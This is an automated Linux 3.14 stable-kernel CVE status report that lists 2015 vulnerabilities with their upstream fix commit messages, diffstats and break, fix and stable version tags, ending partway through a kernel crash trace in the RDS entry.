commit 3f7352bf21f8fd7ba3e2fcef9488756f188e12be
Author: Alexei Starovoitov <ast@plumgrid.com>
Date:   Fri May 22 15:42:55 2015 -0700

    x86: bpf_jit: fix compilation of large bpf programs
    
    x86 has variable length encoding. x86 JIT compiler is trying
    to pick the shortest encoding for given bpf instruction.
    While doing so the jump targets are changing, so JIT is doing
    multiple passes over the program. Typical program needs 3 passes.
    Some very short programs converge with 2 passes. Large programs
    may need 4 or 5. But specially crafted bpf programs may hit the
    pass limit and if the program converges on the last iteration
    the JIT compiler will be producing an image full of 'int 3' insns.
    Fix this corner case by doing final iteration over bpf program.
    
    Fixes: 0a14842f5a3c ("net: filter: Just In Time compiler for x86-64")
    Reported-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: Alexei Starovoitov <ast@plumgrid.com>
    Tested-by: Daniel Borkmann <daniel@iogearbox.net>
    Acked-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 arch/x86/net/bpf_jit_comp.c |    7 ++++++-
 1 file changed, 6 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-4700
Break Date: 2011-04-27
Break Commit: 0a14842f5a3c0e88a1e59fac5c3025db39721f74
Break Tag: 3.0
Linus Fix Date: 2015-05-25
Linus Commit: 3f7352bf21f8fd7ba3e2fcef9488756f188e12be
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: 4ca11e9fe811defdf228d7f579e77b5350c96d02
Stable Tag: 3.14.45

CVE-2015-5156:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.58.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39
Author: Jason Wang <jasowang@redhat.com>
Date:   Wed Aug 5 10:34:04 2015 +0800

    virtio-net: drop NETIF_F_FRAGLIST
    
    virtio declares support for NETIF_F_FRAGLIST, but assumes
    that there are at most MAX_SKB_FRAGS + 2 fragments which isn't
    always true with a fraglist.
    
    A longer fraglist in the skb will make the call to skb_to_sgvec overflow
    the sg array, leading to memory corruption.
    
    Drop NETIF_F_FRAGLIST so we only get what we can handle.
    
    Cc: Michael S. Tsirkin <mst@redhat.com>
    Signed-off-by: Jason Wang <jasowang@redhat.com>
    Acked-by: Michael S. Tsirkin <mst@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/virtio_net.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-5156
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-08-07
Linus Commit: 48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39
Linus Tag: 4.2
Stable Date: 2015-12-09
Stable Commit: 6d419a0b5bcdfe5b2cc8821d11b102dba01b28f6
Stable Tag: 3.14.58

CVE-2015-3290:
CVE-2015-5157:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9b6e6a8334d56354853f9c255d1395c2ba570e0a
Author: Andy Lutomirski <luto@kernel.org>
Date:   Wed Jul 15 10:29:35 2015 -0700

    x86/nmi/64: Switch stacks on userspace NMI entry
    
    Returning to userspace is tricky: IRET can fail, and ESPFIX can
    rearrange the stack prior to IRET.
    
    The NMI nesting fixup relies on a precise stack layout and
    atomic IRET.  Rather than trying to teach the NMI nesting fixup
    to handle ESPFIX and failed IRET, punt: run NMIs that came from
    user mode on the normal kernel stack.
    
    This will make some nested NMIs visible to C code, but the C
    code is okay with that.
    
    As a side effect, this should speed up perf: it eliminates an
    RDMSR when NMIs come from user mode.
    
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Reviewed-by: Steven Rostedt <rostedt@goodmis.org>
    Reviewed-by: Borislav Petkov <bp@suse.de>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/entry/entry_64.S |   62 ++++++++++++++++++++++++++++++++++++++++++---
 1 file changed, 58 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-3290
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-07-17
Linus Commit: 9b6e6a8334d56354853f9c255d1395c2ba570e0a
Linus Tag: 4.2
Stable Date: 2015-10-01
Stable Commit: 66af900f21c6b0b1b59ac156245ca8d2b5d7b696
Stable Tag: 3.14.54

CVE-2015-5257:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.55.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit cbb4be652d374f64661137756b8f357a1827d6a4
Author: Johan Hovold <johan@kernel.org>
Date:   Wed Sep 23 11:41:42 2015 -0700

    USB: whiteheat: fix potential null-deref at probe
    
    Fix potential null-pointer dereference at probe by making sure that the
    required endpoints are present.
    
    The whiteheat driver assumes there are at least five pairs of bulk
    endpoints, of which the final pair is used for the "command port". An
    attempt to bind to an interface with fewer bulk endpoints would
    currently lead to an oops.
    
    Fixes CVE-2015-5257.
    
    Reported-by: Moein Ghasemzadeh <moein@istuary.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/serial/whiteheat.c |   31 +++++++++++++++++++++++++++++++
 1 file changed, 31 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-5257
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-09-23
Linus Commit: cbb4be652d374f64661137756b8f357a1827d6a4
Linus Tag: 4.3
Stable Date: 2015-10-22
Stable Commit: fe6689e03318d5745d88328395fd326e08238533
Stable Tag: 3.14.55

CVE-2015-5283:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4
Author: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>
Date:   Thu Sep 10 17:31:15 2015 -0300

    sctp: fix race on protocol/netns initialization
    
    Consider sctp module is unloaded and is being requested because an user
    is creating a sctp socket.
    
    During initialization, sctp will add the new protocol type and then
    initialize pernet subsys:
    
            status = sctp_v4_protosw_init();
            if (status)
                    goto err_protosw_init;
    
            status = sctp_v6_protosw_init();
            if (status)
                    goto err_v6_protosw_init;
    
            status = register_pernet_subsys(&sctp_net_ops);
    
    The problem is that after those calls to sctp_v{4,6}_protosw_init(), it
    is possible for userspace to create SCTP sockets like if the module is
    already fully loaded. If that happens, one of the possible effects is
    that we will have readers for net->sctp.local_addr_list list earlier
    than expected and sctp_net_init() does not take precautions while
    dealing with that list, leading to a potential panic but not limited to
    that, as sctp_sock_init() will copy a bunch of blank/partially
    initialized values from net->sctp.
    
    The race happens like this:
    
         CPU 0                           |  CPU 1
      socket()                           |
       __sock_create                     | socket()
        inet_create                      |  __sock_create
         list_for_each_entry_rcu(        |
            answer, &inetsw[sock->type], |
            list) {                      |   inet_create
          /* no hits */                  |
         if (unlikely(err)) {            |
          ...                            |
          request_module()               |
          /* socket creation is blocked  |
           * the module is fully loaded  |
           */                            |
           sctp_init                     |
            sctp_v4_protosw_init         |
             inet_register_protosw       |
              list_add_rcu(&p->list,     |
                           last_perm);   |
                                         |  list_for_each_entry_rcu(
                                         |     answer, &inetsw[sock->type],
            sctp_v6_protosw_init         |     list) {
                                         |     /* hit, so assumes protocol
                                         |      * is already loaded
                                         |      */
                                         |  /* socket creation continues
                                         |   * before netns is initialized
                                         |   */
            register_pernet_subsys       |
    
    Simply inverting the initialization order between
    register_pernet_subsys() and sctp_v4_protosw_init() is not possible
    because register_pernet_subsys() will create a control sctp socket, so
    the protocol must be already visible by then. Deferring the socket
    creation to a work-queue is not good specially because we loose the
    ability to handle its errors.
    
    So, as suggested by Vlad, the fix is to split netns initialization in
    two moments: defaults and control socket, so that the defaults are
    already loaded by when we register the protocol, while control socket
    initialization is kept at the same moment it is today.
    
    Fixes: 4db67e808640 ("sctp: Make the address lists per network namespace")
    Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>
    Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/protocol.c |   64 +++++++++++++++++++++++++++++++++------------------
 1 file changed, 41 insertions(+), 23 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-5283
Break Date: 2012-08-14
Break Commit: 4db67e808640e3934d82ce61ee8e2e89fd877ba8
Break Tag: 3.7
Linus Fix Date: 2015-09-11
Linus Commit: 8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4
Linus Tag: 4.3
Stable Date: 2015-10-01
Stable Commit: 62f575aaba7ae93a4e02029d30f9dcf69b84470f
Stable Tag: 3.14.54

CVE-2015-5307:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54a20552e1eae07aa240fa370a0293e006b5faed
Author: Eric Northup <digitaleric@google.com>
Date:   Tue Nov 3 18:03:53 2015 +0100

    KVM: x86: work around infinite loop in microcode when #AC is delivered
    
    It was found that a guest can DoS a host by triggering an infinite
    stream of "alignment check" (#AC) exceptions.  This causes the
    microcode to enter an infinite loop where the core never receives
    another interrupt.  The host kernel panics pretty quickly due to the
    effects (CVE-2015-5307).
    
    Signed-off-by: Eric Northup <digitaleric@google.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/include/uapi/asm/svm.h |    1 +
 arch/x86/kvm/svm.c              |    8 ++++++++
 arch/x86/kvm/vmx.c              |    5 ++++-
 3 files changed, 13 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-5307
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-11-10
Linus Commit: 54a20552e1eae07aa240fa370a0293e006b5faed
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-5327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit cc25b994acfbc901429da682d0f73c190e960206
Author: David Howells <dhowells@redhat.com>
Date:   Thu Nov 12 09:36:40 2015 +0000

    X.509: Fix the time validation [ver #2]
    
    This fixes CVE-2015-5327.  It affects kernels from 4.3-rc1 onwards.
    
    Fix the X.509 time validation to use month number-1 when looking up the
    number of days in that month.  Also put the month number validation before
    doing the lookup so as not to risk overrunning the array.
    
    This can be tested by doing the following:
    
    cat <<EOF | openssl x509 -outform DER | keyctl padd asymmetric "" @s
    -----BEGIN CERTIFICATE-----
    MIIDbjCCAlagAwIBAgIJAN/lUld+VR4hMA0GCSqGSIb3DQEBCwUAMCkxETAPBgNV
    BAoMCGxvY2FsLWNhMRQwEgYDVQQDDAtzaWduaW5nIGtleTAeFw0xNTA5MDEyMTMw
    MThaFw0xNjA4MzEyMTMwMThaMCkxETAPBgNVBAoMCGxvY2FsLWNhMRQwEgYDVQQD
    DAtzaWduaW5nIGtleTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANrn
    crcMfMeG67nagX4+m02Xk9rkmsMKI5XTUxbikROe7GSUVJ27sPVPZp4mgzoWlvhh
    jfK8CC/qhEhwep8Pgg4EJZyWOjhZb7R97ckGvLIoUC6IO3FC2ZnR7WtmWDgo2Jcj
    VlXwJdHhKU1VZwulh81O61N8IBKqz2r/kDhIWiicUCUkI/Do/RMRfKAoDBcSh86m
    gOeIAGfq62vbiZhVsX5dOE8Oo2TK5weAvwUIOR7OuGBl5AqwFlPnXQolewiHzKry
    THg9e44HfzG4Mi6wUvcJxVaQT1h5SrKD779Z5+8+wf1JLaooetcEUArvWyuxCU59
    qxA4lsTjBwl4cmEki+cCAwEAAaOBmDCBlTAMBgNVHRMEBTADAQH/MAsGA1UdDwQE
    AwIHgDAdBgNVHQ4EFgQUyND/eKUis7ep/hXMJ8iZMdUhI+IwWQYDVR0jBFIwUIAU
    yND/eKUis7ep/hXMJ8iZMdUhI+KhLaQrMCkxETAPBgNVBAoMCGxvY2FsLWNhMRQw
    EgYDVQQDDAtzaWduaW5nIGtleYIJAN/lUld+VR4hMA0GCSqGSIb3DQEBCwUAA4IB
    AQAMqm1N1yD5pimUELLhT5eO2lRdGUfTozljRxc7e2QT3RLk2TtGhg65JFFN6eml
    XS58AEPVcAsSLDlR6WpOpOLB2giM0+fV/eYFHHmh22yqTJl4YgkdUwyzPdCHNOZL
    hmSKeY9xliHb6PNrNWWtZwhYYvRaO2DX4GXOMR0Oa2O4vaYu6/qGlZOZv3U6qZLY
    wwHEJSrqeBDyMuwN+eANHpoSpiBzD77S4e+7hUDJnql4j6xzJ65+nWJ89fCrQypR
    4sN5R3aGeIh3QAQUIKpHilwek0CtEaYERgc5m+jGyKSc1rezJW62hWRTaitOc+d5
    G5hh+9YpnYcxQHEKnZ7rFNKJ
    -----END CERTIFICATE-----
    EOF
    
    If it works, it emit a key ID; if it fails, it should give a bad message
    error.
    
    Reported-by: Mimi Zohar <zohar@linux.vnet.ibm.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Tested-by: Mimi Zohar <zohar@linux.vnet.ibm.com>
    Acked-by: David Woodhouse <David.Woodhouse@intel.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 crypto/asymmetric_keys/x509_cert_parser.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-13
CVE: CVE-2015-5327
Break Date: 2015-08-12
Break Commit: fd19a3d195be23e8d9d0d66576b96ea25eea8323
Break Tag: 4.3
Linus Fix Date: 2015-11-12
Linus Commit: cc25b994acfbc901429da682d0f73c190e960206
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-5364:
CVE-2015-5366:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit beb39db59d14990e401e235faf66a6b9b31240b0
Author: Eric Dumazet <edumazet@google.com>
Date:   Sat May 30 09:16:53 2015 -0700

    udp: fix behavior of wrong checksums
    
    We have two problems in UDP stack related to bogus checksums :
    
    1) We return -EAGAIN to application even if receive queue is not empty.
       This breaks applications using edge trigger epoll()
    
    2) Under UDP flood, we can loop forever without yielding to other
       processes, potentially hanging the host, especially on non SMP.
    
    This patch is an attempt to make things better.
    
    We might in the future add extra support for rt applications
    wanting to better control time spent doing a recv() in a hostile
    environment. For example we could validate checksums before queuing
    packets in socket receive queue.
    
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Willem de Bruijn <willemb@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/udp.c |    6 ++----
 net/ipv6/udp.c |    6 ++----
 2 files changed, 4 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-5364
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-05-31
Linus Commit: beb39db59d14990e401e235faf66a6b9b31240b0
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: 542744f265e23eca08f14a8748a3cbf5feb56cdf
Stable Tag: 3.14.45

CVE-2015-5364:
CVE-2015-5366:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit beb39db59d14990e401e235faf66a6b9b31240b0
Author: Eric Dumazet <edumazet@google.com>
Date:   Sat May 30 09:16:53 2015 -0700

    udp: fix behavior of wrong checksums
    
    We have two problems in UDP stack related to bogus checksums :
    
    1) We return -EAGAIN to application even if receive queue is not empty.
       This breaks applications using edge trigger epoll()
    
    2) Under UDP flood, we can loop forever without yielding to other
       processes, potentially hanging the host, especially on non SMP.
    
    This patch is an attempt to make things better.
    
    We might in the future add extra support for rt applications
    wanting to better control time spent doing a recv() in a hostile
    environment. For example we could validate checksums before queuing
    packets in socket receive queue.
    
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Willem de Bruijn <willemb@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/udp.c |    6 ++----
 net/ipv6/udp.c |    6 ++----
 2 files changed, 4 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-5364
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-05-31
Linus Commit: beb39db59d14990e401e235faf66a6b9b31240b0
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: 542744f265e23eca08f14a8748a3cbf5feb56cdf
Stable Tag: 3.14.45

CVE-2015-5697:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.51.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b6878d9e03043695dbf3fa1caa6dfc09db225b16
Author: Benjamin Randazzo <benjamin@randazzo.fr>
Date:   Sat Jul 25 16:36:50 2015 +0200

    md: use kzalloc() when bitmap is disabled
    
    In drivers/md/md.c get_bitmap_file() uses kmalloc() for creating a
    mdu_bitmap_file_t called "file".
    
    5769         file = kmalloc(sizeof(*file), GFP_NOIO);
    5770         if (!file)
    5771                 return -ENOMEM;
    
    This structure is copied to user space at the end of the function.
    
    5786         if (err == 0 &&
    5787             copy_to_user(arg, file, sizeof(*file)))
    5788                 err = -EFAULT
    
    But if bitmap is disabled only the first byte of "file" is initialized
    with zero, so it's possible to read some bytes (up to 4095) of kernel
    space memory from user space. This is an information leak.
    
    5775         /* bitmap disabled, zero the first byte and copy out */
    5776         if (!mddev->bitmap_info.file)
    5777                 file->pathname[0] = '\0';
    
    Signed-off-by: Benjamin Randazzo <benjamin@randazzo.fr>
    Signed-off-by: NeilBrown <neilb@suse.com>

 drivers/md/md.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-5697
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-08-03
Linus Commit: b6878d9e03043695dbf3fa1caa6dfc09db225b16
Linus Tag: 4.2
Stable Date: 2015-08-16
Stable Commit: adbbaa36dd55ff0bde07391d898779760b5206df
Stable Tag: 3.14.51

CVE-2015-5706:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.51.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f15133df088ecadd141ea1907f2c96df67c729f0
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Fri May 8 22:53:15 2015 -0400

    path_openat(): fix double fput()
    
    path_openat() jumps to the wrong place after do_tmpfile() - it has
    already done path_cleanup() (as part of path_lookupat() called by
    do_tmpfile()), so doing that again can lead to double fput().
    
    Cc: stable@vger.kernel.org	# v3.11+
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/namei.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-5706
Break Date: 2013-06-29
Break Commit: 60545d0d4610b02e55f65d141c95b18ccf855b6e
Break Tag: 3.11
Linus Fix Date: 2015-05-09
Linus Commit: f15133df088ecadd141ea1907f2c96df67c729f0
Linus Tag: 4.1
Stable Date: 2015-08-16
Stable Commit: 88b4f377466cb673777d27693acf70108a908106
Stable Tag: 3.14.51

CVE-2015-5707:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.51.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 451a2886b6bf90e2fb378f7c46c655450fb96e81
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Sat Mar 21 20:08:18 2015 -0400

    sg_start_req(): make sure that there's not too many elements in iovec
    
    unfortunately, allowing an arbitrary 16bit value means a possibility of
    overflow in the calculation of total number of pages in bio_map_user_iov() -
    we rely on there being no more than PAGE_SIZE members of sum in the
    first loop there.  If that sum wraps around, we end up allocating
    too small array of pointers to pages and it's easy to overflow it in
    the second loop.
    
    X-Coverup: TINC (and there's no lumber cartel either)
    Cc: stable@vger.kernel.org # way, way back
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 drivers/scsi/sg.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-5707
Break Date: 2008-10-09
Break Commit: 10db10d144c0248f285242f79daf6b9de6b00a62
Break Tag: 2.6
Linus Fix Date: 2015-04-11
Linus Commit: 451a2886b6bf90e2fb378f7c46c655450fb96e81
Linus Tag: 4.1
Stable Date: 2015-08-16
Stable Commit: 08ac1787579cb8bd9e7333836269e76801905597
Stable Tag: 3.14.51

CVE-2015-5707:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fdc81f45e9f57858da6351836507fbcf1b7583ee
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Sat Mar 21 20:25:30 2015 -0400

    sg_start_req(): use import_iovec()
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 drivers/scsi/sg.c |   16 +++++-----------
 1 file changed, 5 insertions(+), 11 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-5707
Break Date: 2015-03-30
Break Commit: bc917be8105993c256338ad1189650364a741483
Break Tag: 4.1
Linus Fix Date: 2015-04-11
Linus Commit: fdc81f45e9f57858da6351836507fbcf1b7583ee
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-6252:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.50.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5
Author: Marc-Andr Lureau <marcandre.lureau@redhat.com>
Date:   Fri Jul 17 15:32:03 2015 +0200

    vhost: actually track log eventfd file
    
    While reviewing vhost log code, I found out that log_file is never
    set. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Marc-Andr Lureau <marcandre.lureau@redhat.com>
    Signed-off-by: Michael S. Tsirkin <mst@redhat.com>

 drivers/vhost/vhost.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-6252
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-07-27
Linus Commit: 7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5
Linus Tag: 4.2
Stable Date: 2015-08-10
Stable Commit: a0a45c374d8478fb4ec2e3b4949e394d75ceb11a
Stable Tag: 3.14.50

CVE-2015-6526:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.41.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9a5cbce421a283e6aea3c4007f141735bf9da8c3
Author: Anton Blanchard <anton@samba.org>
Date:   Tue Apr 14 07:51:03 2015 +1000

    powerpc/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH
    
    We cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH
    (currently 127), but we forgot to do the same for 64bit backtraces.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Anton Blanchard <anton@samba.org>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/perf/callchain.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-6526
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-04-14
Linus Commit: 9a5cbce421a283e6aea3c4007f141735bf9da8c3
Linus Tag: 4.1
Stable Date: 2015-05-06
Stable Commit: 83dffc246d8b217cd9f577a8859c97b6054806cb
Stable Tag: 3.14.41

CVE-2015-6937:
CVE-2015-7990:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 74e98eb085889b0d2d4908f59f6e00026063014f
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Tue Sep 8 10:53:40 2015 -0400

    RDS: verify the underlying transport exists before creating a connection
    
    There was no verification that an underlying transport exists when creating
    a connection, this would cause dereferencing a NULL ptr.
    
    It might happen on sockets that weren't properly bound before attempting to
    send a message, which will cause a NULL ptr deref:
    
    [135546.047719] kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN
    [135546.051270] Modules linked in:
    [135546.051781] CPU: 4 PID: 15650 Comm: trinity-c4 Not tainted 4.2.0-next-20150902-sasha-00041-gbaa1222-dirty #2527
    [135546.053217] task: ffff8800835bc000 ti: ffff8800bc708000 task.ti: ffff8800bc708000
    [135546.054291] RIP: __rds_conn_create (net/rds/connection.c:194)
    [135546.055666] RSP: 0018:ffff8800bc70fab0  EFLAGS: 00010202
    [135546.056457] RAX: dffffc0000000000 RBX: 0000000000000f2c RCX: ffff8800835bc000
    [135546.057494] RDX: 0000000000000007 RSI: ffff8800835bccd8 RDI: 0000000000000038
    [135546.058530] RBP: ffff8800bc70fb18 R08: 0000000000000001 R09: 0000000000000000
    [135546.059556] R10: ffffed014d7a3a23 R11: ffffed014d7a3a21 R12: 0000000000000000
    [135546.060614] R13: 0000000000000001 R14: ffff8801ec3d0000 R15: 0000000000000000
    [135546.061668] FS:  00007faad4ffb700(0000) GS:ffff880252000000(0000) knlGS:0000000000000000
    [135546.062836] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
    [135546.063682] CR2: 000000000000846a CR3: 000000009d137000 CR4: 00000000000006a0
    [135546.064723] Stack:
    [135546.065048]  ffffffffafe2055c ffffffffafe23fc1 ffffed00493097bf ffff8801ec3d0008
    [135546.066247]  0000000000000000 00000000000000d0 0000000000000000 ac194a24c0586342
    [135546.067438]  1ffff100178e1f78 ffff880320581b00 ffff8800bc70fdd0 ffff880320581b00
    [135546.068629] Call Trace:
    [135546.069028] ? __rds_conn_create (include/linux/rcupdate.h:856 net/rds/connection.c:134)
    [135546.069989] ? rds_message_copy_from_user (net/rds/message.c:298)
    [135546.071021] rds_conn_create_outgoing (net/rds/connection.c:278)
    [135546.071981] rds_sendmsg (net/rds/send.c:1058)
    [135546.072858] ? perf_trace_lock (include/trace/events/lock.h:38)
    [135546.073744] ? lockdep_init (kernel/locking/lockdep.c:3298)
    [135546.074577] ? rds_send_drop_to (net/rds/send.c:976)
    [135546.075508] ? __might_fault (./arch/x86/include/asm/current.h:14 mm/memory.c:3795)
    [135546.076349] ? __might_fault (mm/memory.c:3795)
    [135546.077179] ? rds_send_drop_to (net/rds/send.c:976)
    [135546.078114] sock_sendmsg (net/socket.c:611 net/socket.c:620)
    [135546.078856] SYSC_sendto (net/socket.c:1657)
    [135546.079596] ? SYSC_connect (net/socket.c:1628)
    [135546.080510] ? trace_dump_stack (kernel/trace/trace.c:1926)
    [135546.081397] ? ring_buffer_unlock_commit (kernel/trace/ring_buffer.c:2479 kernel/trace/ring_buffer.c:2558 kernel/trace/ring_buffer.c:2674)
    [135546.082390] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749)
    [135546.083410] ? trace_event_raw_event_sys_enter (include/trace/events/syscalls.h:16)
